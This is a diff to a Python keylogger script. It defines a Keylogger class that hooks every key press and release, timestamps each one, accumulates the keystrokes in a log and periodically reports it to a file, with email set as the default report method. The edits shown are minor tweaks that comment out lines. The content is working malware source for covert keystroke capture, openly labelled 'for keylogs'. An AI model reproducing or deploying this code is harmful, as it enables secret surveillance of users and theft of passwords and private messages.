@@ -1,3 +1,4 @@
+
 import keyboard # for keylogs
 from threading import Timer
 from datetime import datetime
@@ -6,6 +7,8 @@ SEND_REPORT_EVERY = 5 # in seconds, 60 means 1 minute and so on
 
 
 class Keylogger:
+#    current = ""
+
     def __init__(self, interval, report_method="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
@@ -14,8 +17,7 @@ class Keylogger:
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+
 
     def callback(self, event):
         now = datetime.now()
@@ -25,7 +27,9 @@ class Keylogger:
         """
         name = event.name
         eventtype = event.event_type
-        print
+    #    self.start_dt = event.time
+    #    self.end_dt = event.time
+
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
             # uppercase with []
@@ -46,6 +50,7 @@ class Keylogger:
             name = "\n" + now.strftime("%H:%M:%S") + " Released: " + name
         elif eventtype == "down":
             name = "\n" + now.strftime("%H:%M:%S") + " Pressed: " + name
+
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
@@ -73,7 +78,7 @@ class Keylogger:
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
-            self.update_filename()
+            #self.update_filename()
             self.report_to_file()
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
